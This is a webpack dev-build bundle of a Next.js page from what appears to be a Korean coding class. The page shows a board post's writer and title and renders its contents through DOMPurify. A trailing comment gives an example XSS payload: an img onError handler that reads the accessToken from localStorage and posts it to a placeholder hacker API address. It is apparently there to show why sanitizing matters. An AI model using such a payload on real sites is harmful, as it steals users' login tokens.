"use strict";
/*
 * ATTENTION: An "eval-source-map" devtool has been used.
 * This devtool is neither made for production nor for readable output files.
 * It uses "eval()" calls to create a separate source file with attached SourceMaps in the browser devtools.
 * If you are trying to read the output file, select a different devtool (https://webpack.js.org/configuration/devtool/)
 * or disable the default devtool with "devtool: false".
 * If you are looking for production-ready output files, see mode: "production" (https://webpack.js.org/configuration/mode/).
 */
(() => {
var exports = {};
exports.id = "pages/27-04-web-editor-detail/[_id]";
exports.ids = ["pages/27-04-web-editor-detail/[_id]"];
exports.modules = {

/***/ "./pages/27-04-web-editor-detail/[_id]/index.js":
/*!******************************************************!*\
  !*** ./pages/27-04-web-editor-detail/[_id]/index.js ***!
  \******************************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

eval("__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": () => (/* binding */ StaticRoutedPage)\n/* harmony export */ });\n/* harmony import */ var react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! react/jsx-dev-runtime */ \"react/jsx-dev-runtime\");\n/* harmony import */ var react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0__);\n/* harmony import */ var _apollo_client__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @apollo/client */ \"@apollo/client\");\n/* harmony import */ var _apollo_client__WEBPACK_IMPORTED_MODULE_1___default = /*#__PURE__*/__webpack_require__.n(_apollo_client__WEBPACK_IMPORTED_MODULE_1__);\n/* harmony import */ var next_router__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! next/router */ \"next/router\");\n/* harmony import */ var next_router__WEBPACK_IMPORTED_MODULE_2___default = /*#__PURE__*/__webpack_require__.n(next_router__WEBPACK_IMPORTED_MODULE_2__);\n/* harmony import */ var dompurify__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! dompurify */ \"dompurify\");\n/* harmony import */ var dompurify__WEBPACK_IMPORTED_MODULE_3___default = /*#__PURE__*/__webpack_require__.n(dompurify__WEBPACK_IMPORTED_MODULE_3__);\n\n\n\n\nconst FETCH_BOARD = _apollo_client__WEBPACK_IMPORTED_MODULE_1__.gql`\n  query fetchBoard($boardId: ID!) {\n    fetchBoard(boardId: $boardId) {\n      _id\n      writer\n      title\n      contents\n    }\n  }\n`;\nfunction StaticRoutedPage() {\n    const router = (0,next_router__WEBPACK_IMPORTED_MODULE_2__.useRouter)();\n    const { data  } = (0,_apollo_client__WEBPACK_IMPORTED_MODULE_1__.useQuery)(FETCH_BOARD, {\n        variables: {\n            boardId: String(router.query._id)\n        }\n    });\n    return(/*#__PURE__*/ (0,react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxDEV)(react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0__.Fragment, {\n        children: [\n            /*#__PURE__*/ (0,react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxDEV)(\"div\", {\n                children: [\n                    \"작성자: \",\n                    data ? data.fetchBoard.writer : \"로딩중입니다...\"\n                ]\n            }, void 0, true, {\n                fileName: \"/Users/larmong/Desktop/codecamp/04frontend/class/pages/27-04-web-editor-detail/[_id]/index.js\",\n                lineNumber: 27,\n                columnNumber: 7\n            }, this),\n            /*#__PURE__*/ (0,react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxDEV)(\"div\", {\n                children: [\n                    \"제목: \",\n                    data && data.fetchBoard.title\n                ]\n            }, void 0, true, {\n                fileName: \"/Users/larmong/Desktop/codecamp/04frontend/class/pages/27-04-web-editor-detail/[_id]/index.js\",\n                lineNumber: 28,\n                columnNumber: 7\n            }, this),\n             false && /*#__PURE__*/ 0\n        ]\n    }, void 0, true));\n}; // playground XSS 공격\n // <img src=\"#\" onError=\"\n // \tconst aaa = localStorage.getItem('accessToken');\n // \taxios.post(해커API주소, {accessToken = aaa});\n // \"/>\n//# sourceURL=[module]\n//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJmaWxlIjoiLi9wYWdlcy8yNy0wNC13ZWItZWRpdG9yLWRldGFpbC9bX2lkXS9pbmRleC5qcy5qcyIsIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7O0FBQThDO0FBQ1A7QUFDTjtBQUVqQyxLQUFLLENBQUNJLFdBQVcsR0FBR0osK0NBQUcsQ0FBQzs7Ozs7Ozs7O0FBU3hCO0FBRWUsUUFBUSxDQUFDSyxnQkFBZ0IsR0FBRyxDQUFDO0lBQzFDLEtBQUssQ0FBQ0MsTUFBTSxHQUFHSixzREFBUztJQUV4QixLQUFLLENBQUMsQ0FBQyxDQUFDSyxJQUFJLEVBQUMsQ0FBQyxHQUFHTix3REFBUSxDQUFDRyxXQUFXLEVBQUUsQ0FBQztRQUN0Q0ksU0FBUyxFQUFFLENBQUM7WUFDVkMsT0FBTyxFQUFFQyxNQUFNLENBQUNKLE1BQU0sQ0FBQ0ssS0FBSyxDQUFDQyxHQUFHO1FBQ2xDLENBQUM7SUFDSCxDQUFDO0lBRUQsTUFBTTs7d0ZBRURDLENBQUc7O29CQUFDLENBQUs7b0JBQU9OLElBQUksR0FBR0EsSUFBSSxDQUFDTyxVQUFVLENBQUNDLE1BQU0sR0FBRyxDQUFXOzs7Ozs7O3dGQUN6Q0YsQ0FBZjs7b0JBQUMsQ0FBSTtvQkFBS04sSUFBSSxJQUFJQSxJQUFJLENBQUNPLFVBQVUsQ0FBQ0UsS0FBSzs7Ozs7OztZQUV0QyxNQUF5Qjs7O0FBU3BDLENBQUMsQ0FFRCxDQUFvQixFQUFJO0FBQ3BCLENBQXFCO0FBQ3pCLENBQW9EO0FBQ3BELENBQTZDO0FBQzdDLENBQU0iLCJzb3VyY2VzIjpbIndlYnBhY2s6Ly9jbGFzcy8uL3BhZ2VzLzI3LTA0LXdlYi1lZGl0b3ItZGV0YWlsL1tfaWRdL2luZGV4LmpzPzg2MTciXSwic291cmNlc0NvbnRlbnQiOlsiaW1wb3J0IHsgZ3FsLCB1c2VRdWVyeSB9IGZyb20gXCJAYXBvbGxvL2NsaWVudFwiO1xuaW1wb3J0IHsgdXNlUm91dGVyIH0gZnJvbSBcIm5leHQvcm91dGVyXCI7XG5pbXBvcnQgRG9tcHVyaWZ5IGZyb20gXCJkb21wdXJpZnlcIjtcblxuY29uc3QgRkVUQ0hfQk9BUkQgPSBncWxgXG4gIHF1ZXJ5IGZldGNoQm9hcmQoJGJvYXJkSWQ6IElEISkge1xuICAgIGZldGNoQm9hcmQoYm9hcmRJZDogJGJvYXJkSWQpIHtcbiAgICAgIF9pZFxuICAgICAgd3JpdGVyXG4gICAgICB0aXRsZVxuICAgICAgY29udGVudHNcbiAgICB9XG4gIH1cbmA7XG5cbmV4cG9ydCBkZWZhdWx0IGZ1bmN0aW9uIFN0YXRpY1JvdXRlZFBhZ2UoKSB7XG4gIGNvbnN0IHJvdXRlciA9IHVzZVJvdXRlcigpO1xuXG4gIGNvbnN0IHsgZGF0YSB9ID0gdXNlUXVlcnkoRkVUQ0hfQk9BUkQsIHtcbiAgICB2YXJpYWJsZXM6IHtcbiAgICAgIGJvYXJkSWQ6IFN0cmluZyhyb3V0ZXIucXVlcnkuX2lkKSxcbiAgICB9LFxuICB9KTtcblxuICByZXR1cm4gKFxuICAgIDw+XG4gICAgICA8ZGl2PuyekeyEseyekDoge2RhdGEgPyBkYXRhLmZldGNoQm9hcmQud3JpdGVyIDogXCLroZzrlKnspJHsnoXri4jri6QuLi5cIn08L2Rpdj5cbiAgICAgIDxkaXY+7KCc66qpOiB7ZGF0YSAmJiBkYXRhLmZldGNoQm9hcmQudGl0bGV9PC9kaXY+XG4gICAgICB7Lyo8ZGl2PuuCtOyaqToge2RhdGE/LmZldGNoQm9hcmQuY29udGVudHN9PC9kaXY+Ki99XG4gICAgICB7dHlwZW9mIHdpbmRvdyAhPT0gXCJ1bmRlZmluZWRcIiAmJiAoXG4gICAgICAgIDxkaXZcbiAgICAgICAgICBkYW5nZXJvdXNseVNldElubmVySFRNTD17e1xuICAgICAgICAgICAgX19odG1sOiBEb21wdXJpZnkuc2FuaXRpemUoZGF0YT8uZmV0Y2hCb2FyZC5jb250ZW50cyksXG4gICAgICAgICAgfX1cbiAgICAgICAgPjwvZGl2PlxuICAgICAgKX1cbiAgICA8Lz5cbiAgKTtcbn1cblxuLy8gcGxheWdyb3VuZCBYU1Mg6rO16rKpXG4vLyA8aW1nIHNyYz1cIiNcIiBvbkVycm9yPVwiXG4vLyBcdGNvbnN0IGFhYSA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCdhY2Nlc3NUb2tlbicpO1xuLy8gXHRheGlvcy5wb3N0KO2VtOy7pEFQSeyjvOyGjCwge2FjY2Vzc1Rva2VuID0gYWFhfSk7XG4vLyBcIi8+XG4iXSwibmFtZXMiOlsiZ3FsIiwidXNlUXVlcnkiLCJ1c2VSb3V0ZXIiLCJEb21wdXJpZnkiLCJGRVRDSF9CT0FSRCIsIlN0YXRpY1JvdXRlZFBhZ2UiLCJyb3V0ZXIiLCJkYXRhIiwidmFyaWFibGVzIiwiYm9hcmRJZCIsIlN0cmluZyIsInF1ZXJ5IiwiX2lkIiwiZGl2IiwiZmV0Y2hCb2FyZCIsIndyaXRlciIsInRpdGxlIiwiZGFuZ2Vyb3VzbHlTZXRJbm5lckhUTUwiLCJfX2h0bWwiLCJzYW5pdGl6ZSIsImNvbnRlbnRzIl0sInNvdXJjZVJvb3QiOiIifQ==\n//# sourceURL=webpack-internal:///./pages/27-04-web-editor-detail/[_id]/index.js\n");

/***/ }),

/***/ "@apollo/client":
/*!*********************************!*\
  !*** external "@apollo/client" ***!
  \*********************************/
/***/ ((module) => {

module.exports = require("@apollo/client");

/***/ }),

/***/ "dompurify":
/*!****************************!*\
  !*** external "dompurify" ***!
  \****************************/
/***/ ((module) => {

module.exports = require("dompurify");

/***/ }),

/***/ "next/router":
/*!******************************!*\
  !*** external "next/router" ***!
  \******************************/
/***/ ((module) => {

module.exports = require("next/router");

/***/ }),

/***/ "react/jsx-dev-runtime":
/*!****************************************!*\
  !*** external "react/jsx-dev-runtime" ***!
  \****************************************/
/***/ ((module) => {

module.exports = require("react/jsx-dev-runtime");

/***/ })

};
;

// load runtime
var __webpack_require__ = require("../../webpack-runtime.js");
__webpack_require__.C(exports);
var __webpack_exec__ = (moduleId) => (__webpack_require__(__webpack_require__.s = moduleId))
var __webpack_exports__ = (__webpack_exec__("./pages/27-04-web-editor-detail/[_id]/index.js"));
module.exports = __webpack_exports__;

})();